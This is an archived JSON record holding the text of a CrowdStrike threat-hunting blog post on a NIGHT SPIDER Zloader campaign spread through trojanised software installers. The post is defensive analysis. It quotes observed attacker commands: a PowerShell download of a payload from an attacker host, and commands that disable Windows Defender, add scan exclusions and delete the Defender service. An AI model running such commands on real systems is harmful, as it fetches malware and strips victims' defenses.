{
    "id": "09bcbc22-f3ff-4577-92d1-5260573720ce",
    "created_at": "2023-01-12T15:08:05.839758Z",
    "updated_at": "2025-03-27T02:09:17.80589Z",
    "deleted_at": null,
    "sha1_hash": "cf0f38f9a24c4019b2f737c565fc23060f64d707",
    "title": "2022-03-14 - Falcon OverWatch Threat Hunting Uncovers Ongoing NIGHT SPIDER Zloader Campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T23:23:15Z",
    "file_modification_date": "2022-05-28T23:23:15Z",
    "file_size": 1096179,
    "plain_text": "# OverWatch Uncovers Ongoing NIGHT SPIDER Zloader Campaign\n\n**[crowdstrike.com/blog/falcon-overwatch-uncovers-ongoing-night-spider-zloader-campaign/](https://www.crowdstrike.com/blog/falcon-overwatch-uncovers-ongoing-night-spider-zloader-campaign/)**\n\nMarch 14, 2022\n\n## Falcon OverWatch Threat Hunting Uncovers Ongoing NIGHT SPIDER Zloader Campaign\n\nMarch 14, 2022\n\n[Falcon OverWatch Team](https://www.crowdstrike.com/blog/author/falcon-overwatch-team/) [From The Front Lines](https://www.crowdstrike.com/blog/category/from-the-front-lines/)\n\nOver recent months, the CrowdStrike Falcon OverWatch™ team has tracked an ongoing,\nwidespread intrusion campaign leveraging bundled `.msi installers to trick victims into`\ndownloading malicious payloads alongside legitimate software. These payloads and scripts\nwere used to perform reconnaissance and ultimately download and execute NIGHT\nSPIDER’s Zloader trojan, as detailed in CrowdStrike Falcon X™ Premium reporting. This\nblog shows how OverWatch went about tracking and alerting customers to this activity,\ndespite the adversary’s attempts to evade detection.\n\n## Attempts to Hide Prove to Be the Key to Being Found\n\n\n-----\n\nWhether it s adopting new tools or new techniques, adversaries continuously iterate their\noperations in an effort to stay a step ahead of defenders. What sets OverWatch apart is its\nfocus on detecting exactly this type of anomalous activity rather than relying on atomic and\nstatic indicators to look for known threats.\n\nLate in 2021, OverWatch detected a wave of activity leveraging bundled `.msi installers to`\nexecute scripts and remotely download additional malicious payloads. The initial installers\nwere masquerading as legitimate Zoom, Atera, NetSupport, Brave Browser, JavaPlugin and\nTeamViewer installers, but the programs were also packaged with malicious scripts and\npayloads to perform automated reconnaissance and download the Zloader trojan, and in\nsome cases, Cobalt Strike. The adversary’s use of evasive techniques was ultimately what\nenabled OverWatch to quickly zero in on these attempted intrusions.\n\nFigure 1. Process tree that shows OverWatch detection of Launcher.exe executing malicious scripts,\n\nremotely downloading additional payloads and leveraging native utilities (Click to enlarge)\n\nOverWatch’s detective capability against this campaign can be attributed to three pillars of\nanalysis that threat hunters use to rapidly assess hunting leads: behavior, prevalence and\ntiming. In the case of this campaign, OverWatch uncovered suspicious behaviors\nassociated with the use of native utilities, the presence of low-prevalence files and the\ncoincidence of both of these in a short time period impacting several customers. In fact, it\nwas the adversary’s attempts to evade detection that so quickly caught OverWatch’s\nattention. The list that follows outlines the suspicious behaviors that OverWatch observed in\nthe analyzed Zloader campaign, which was developed by NIGHT SPIDER. The list also\nshows example command lines related to these behaviors.\n\nNumerous unknown scripts spawned from a low-prevalence binary packaged in highprevalence `.msi` files with well-known names (Team Viewer, Zoom, NetSupport\nManager, Atera, Brave Browser, JavaPlugin) and legitimate hashes.\n\n\n-----\n\nThe Microsoft Windows command or wscript utility used PowerShell to beacon to the\ninternet and remotely download a payload.\n```\n      powershell Invoke-WebRequest\n      https[:]//clouds222[.]com/t1m/index/processingSetRequestBat2/?\n      servername=msi -OutFile flash.bat\n\n```\nThe downloaded payload was a low-prevalence file.\nThe scripts used the Windows-native Mshta utility or PowerShell to impair Windows\nDefender.\n```\n      Powershell.exe -command “Set0MpPreference -DisableIOAVProtection $true”\n      powershell.exe -inputformat none -outputformat none -NonInteractive       Command Add-MpPreference -ExclusionPath 'C:\\Users\\User\\AppData\\Roaming*'\n\n```\nThe scripts used PowerShell in an attempt to bypass Microsoft’s AntiMalware Scan\nInterface (AMSI).\nThe adminpriv.exe utility was used in an attempt to manipulate registry values.\n```\n      adminpriv -U:T -ShowWindowMode:Hide reg add\n      \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v\n      \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f\n      adminpriv -U:T -ShowWindowMode:Hide sc delete windefend\n\n```\nMSIEXEC was used in an unusual manner to manipulate registry entries that would\nsuggest process abuse.\nA script was used to issue a sleep command and decrypt a payload using the\nlegitimate GPG software. The same password was observed at various customers.\n```\n      \"C:\\Users\\[User]\\AppData\\Local\\Temp\\WScriptSleeper.vbs\" 45000\n      CMD: PowerShell -NoProfile -ExecutionPolicy Bypass -command Import-Module\n      GnuPg; Remove-Encryption -FolderPath C:\\Users\\[REDACTED]\\AppData\\Roaming       Password [REDACTED]\n      CMD: \"C:\\Program Files (x86)\\GNU\\GnuPG\\gpg2.exe\" --batch --yes -      passphrase [REDACTED] -o C:\\Users\\[REDACTED]\\AppData\\Roaming\\zoom.dll -d\n      C:\\Users\\[REDACTED]\\AppData\\Roaming\\zoom.dll.gpg\n\n## Three Pillars of Rapid Assessment: Behavior, Prevalence and Timing\n\n```\nOverWatch hunts for the last 1% of malicious activity that seeks to evade technology-based\ndefenses. To achieve this, threat hunters must build a picture not just from one or two data\npoints, but by carefully piecing together a myriad of subtle clues when something doesn’t\nlook quite right.\n\n\n-----\n\n1. OverWatch hunts for unexpected behaviors stemming from otherwise mundane or\n\nroutine actions. This means threat hunters need a deep familiarity with the wide\nvariety of processes, applications, operating systems, configurations, network\ncommunications and network architectures that represent the sum of normal day-today operations. Similarly, hunters need a deep understanding of adversary tradecraft,\nexploits and the way that normal day-to-day operations can be manipulated for\nmalicious purposes. This breadth and depth of knowledge means that hunters can\nrapidly identify anomalous behaviors by identifying activity that does not align with\nexpected intent or functionality of a system. In the case of the bundled installer\ncampaign, OverWatch observed an unidentified file attempting to bypass security on\nmore than one occasion, which immediately stood out as unusual.\n2. Prevalence also plays an important role in threat hunting, as low-prevalence\n\nbehaviors can be indicative of a system being used for unintended purposes.\nCrowdStrike Threat Graph provides OverWatch with real-time visibility across the®\nentire Falcon platform install base, while patented tooling enables threat hunters to\nimmediately pivot on an indicator to determine whether it is common or not — not just\nwithin one environment but across all environments. In scenarios where there is\nsuspicious behavior coupled with low-prevalence indicators, these two pillars provide\ncircumstantial findings to inform hunters’ analysis.\n3. Time is the third pillar of threat hunting. Suspicious behavior and low-prevalence\n\nindicators, all uncovered in a short period of time sound alarm bells for threat hunters.\nThis trifecta of activity can often indicate successful targeted phishing attempts, new\ncampaigns or the active exploitation of a zero-day in an application. In the example of\nthe Zloader malicious installer campaign, OverWatch’s extensive data and finely tuned\nhunting leads effectively identified the coincidence of 8-10 suspicious behaviors all\nwithin seconds of each other. This left hunters in no doubt that the activity was\nmalicious and enabled them to send timely and high-fidelity notifications to the victim\norganizations.\n\n## Nowhere to Hide for NIGHT SPIDER\n\nThe powerful combination of the vast telemetry of the CrowdStrike Security Cloud and\nOverWatch’s patented hunting workflows and expert threat hunters enabled the rapid\nidentification of NIGHT SPIDER’s Zloader campaign. The threat actor’s attempts to avoid\ndetection caught the attention of threat hunters who were able to quickly piece together the\nevidence of a campaign in progress. Early detection of campaigns such as this enables\nOverWatch to provide organizations with early warning about threats to their environment\nand empowers organizations to remediate before any significant damage is done.\n\n**Additional Resources**\n\n_Read the_ _[2021 Threat Hunting Report blog or download the report now.](https://www.crowdstrike.com/blog/2021-threat-hunting-report-preview/)_\n_[Learn more about Falcon OverWatch’s proactive managed threat hunting.](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)_\n\n\n-----\n\n_Discover the power of tailored threat hunting OverWatch Elite provides customers in_\n_this blog post._\n_[Watch how Falcon OverWatch proactively hunts for threats in your environment.](https://www.crowdstrike.com/resources/videos/falcon-overwatch-proactively-hunts-threats-environment/)_\n_[Learn more about Falcon X Premium cyber threat intelligence.](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/premium/)_\n_[Read more about how part-time threat hunting is simply not enough in this blog post.](https://www.crowdstrike.com/blog/the-myth-of-part-time-threat-hunting-part-1/)_\n_[Learn more about the CrowdStrike Falcon® platform.](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)_\n\nRelated Content\n\nNowhere to Hide: Detecting a Vishing Intrusion at a Retail Company\n\nThe CrowdStrike Falcon OverWatch™ 2021 Threat Hunting Report details the interactive\nintrusion activity observed by hunters from July 2020 to June 2021. While the report brings\nto light some of the new and innovative ways threat actors are gaining access into victim\norganization’s networks, social engineering remains a tried and true method of gaining\naccess […]\n\n\n-----\n\nHunting pwnkit Local Privilege Escalation in Linux (CVE-2021-4034)\n\nIn November 2021, a vulnerability was discovered in a ubiquitous Linux module named\nPolkit. Developed by Red Hat, Polkit facilitates the communication between privileged and\nunprivileged processes on Linux endpoints. Due to a flaw in a component of Polkit —\npkexec — a local privilege escalation vulnerability exists that, when exploited, will allow a\nstandard […]\n\n\n-----\n\nNew Docker Cryptojacking Attempts Detected Over 2021 End-of-Year Holidays\n\nCryptocurrency mining has become very popular among malicious actors that aim to profit\nby exploiting cloud attack surfaces. Exposed Docker APIs have become a common target\nfor cryptominers to mine various cryptocurrencies. According to the Google Threat Horizon\nreport published Nov. 29, 2021, 86% of compromised Google Cloud instances were used\nto perform cryptocurrency mining. […]\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-14 - Falcon OverWatch Threat Hunting Uncovers Ongoing NIGHT SPIDER Zloader Campaign.pdf"
    ],
    "report_names": [
        "2022-03-14 - Falcon OverWatch Threat Hunting Uncovers Ongoing NIGHT SPIDER Zloader Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536085,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653780195,
    "ts_modification_date": 1653780195,
    "files": {
        "pdf": "https://archive.orkl.eu/cf0f38f9a24c4019b2f737c565fc23060f64d707.pdf",
        "text": "https://archive.orkl.eu/cf0f38f9a24c4019b2f737c565fc23060f64d707.txt",
        "img": "https://archive.orkl.eu/cf0f38f9a24c4019b2f737c565fc23060f64d707.jpg"
    }
}